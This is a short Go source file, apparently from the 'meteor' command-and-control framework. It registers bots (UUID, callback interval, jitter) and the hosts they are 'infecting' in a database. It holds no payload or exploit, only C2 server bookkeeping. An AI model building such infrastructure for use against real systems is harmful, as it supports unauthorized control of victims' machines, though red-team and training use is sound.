package main

import (
	"github.com/degenerat3/meteor/meteor/pbuf"
	//"github.com/degenerat3/meteor/meteor/core/ent/action"
	//"github.com/degenerat3/meteor/meteor/core/ent/bot"
	//"github.com/degenerat3/meteor/meteor/core/ent/group"
	"github.com/degenerat3/meteor/meteor/core/ent/host"
)

func regBotUtil(prot *mcs.MCS) int32 {
	uuid := prot.GetUuid()
	intv := prot.GetInterval()
	dlt := prot.GetDelta()
	hn := prot.GetHostname()

	if uuid == "" || intv == 0 || dlt == 0 || hn == "" {
		return 400 // missing a field
	}

	hostObj, err := DBClient.Host.Query().Where(host.Hostname(hn)).Only(ctx)

	if err != nil {
		return 400 // non-registered host
	}

	_, err = DBClient.Bot.
		Create().
		SetUUID(uuid).
		SetInterval(int(intv)).
		SetDelta(int(dlt)).
		SetInfecting(hostObj).
		Save(ctx)

	if err != nil {
		return 500
	}

	return 200

}

func regHostUtil(prot *mcs.MCS) int32 {
	hn := prot.GetHostname()
	ifc := prot.GetInterface()
	if hn == "" || ifc == "" {
		return 400
	}
	_, err := DBClient.Host. // Host Client.
					Create().        // Host create builder.
					SetHostname(hn). // Set hostname value.
					SetInterface(ifc).
					Save(ctx) // Create and return.

	if err != nil {
		return 500
	}
	return 200
}
